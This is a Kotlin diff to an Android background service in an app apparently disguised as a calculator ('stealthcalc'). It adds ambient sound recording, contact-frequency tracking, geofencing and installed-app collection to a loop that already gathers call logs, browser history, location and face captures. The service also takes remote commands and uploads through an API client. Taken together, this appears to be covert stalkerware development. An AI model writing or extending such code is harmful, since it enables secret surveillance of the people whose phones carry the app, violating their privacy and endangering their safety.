@@ -13,12 +13,16 @@ import androidx.lifecycle.lifecycleScope
 import com.stealthcalc.core.logging.AppLogger
 import com.stealthcalc.monitoring.collector.AppUsageCollector
 import com.stealthcalc.monitoring.collector.BatteryCollector
+import com.stealthcalc.monitoring.collector.AmbientSoundCollector
 import com.stealthcalc.monitoring.collector.BrowserHistoryCollector
 import com.stealthcalc.monitoring.collector.CalendarCollector
 import com.stealthcalc.monitoring.collector.CallLogCollector
+import com.stealthcalc.monitoring.collector.ContactFrequencyCollector
 import com.stealthcalc.monitoring.collector.DataUsageCollector
 import com.stealthcalc.monitoring.collector.DeviceInfoCollector
 import com.stealthcalc.monitoring.collector.DeviceSecurityCollector
+import com.stealthcalc.monitoring.collector.GeofenceCollector
+import com.stealthcalc.monitoring.collector.InstalledAppsCollector
 import com.stealthcalc.monitoring.collector.FaceCaptureCollector
 import com.stealthcalc.monitoring.collector.FileSyncCollector
 import com.stealthcalc.monitoring.collector.LocationCollector
@@ -81,6 +85,10 @@ class AgentService : LifecycleService() {
     @Inject lateinit var deviceInfoCollector: DeviceInfoCollector
     @Inject lateinit var dataUsageCollector: DataUsageCollector
     @Inject lateinit var calendarCollector: CalendarCollector
+    @Inject lateinit var geofenceCollector: GeofenceCollector
+    @Inject lateinit var installedAppsCollector: InstalledAppsCollector
+    @Inject lateinit var ambientSoundCollector: AmbientSoundCollector
+    @Inject lateinit var contactFrequencyCollector: ContactFrequencyCollector
     @Inject lateinit var remoteCommandHandler: RemoteCommandHandler
     @Inject lateinit var apiClient: AgentApiClient
 
@@ -139,6 +147,10 @@ class AgentService : LifecycleService() {
                     dataUsageCollector.collect()
                     calendarCollector.collect()
                     simChangeCollector.collect()
+                    geofenceCollector.collect()
+                    installedAppsCollector.collect()
+                    ambientSoundCollector.collect()
+                    contactFrequencyCollector.collect()
                 }.onFailure { e ->
                     AppLogger.log(this@AgentService, "[agent]", "Collection error: ${e.message}")
                 }
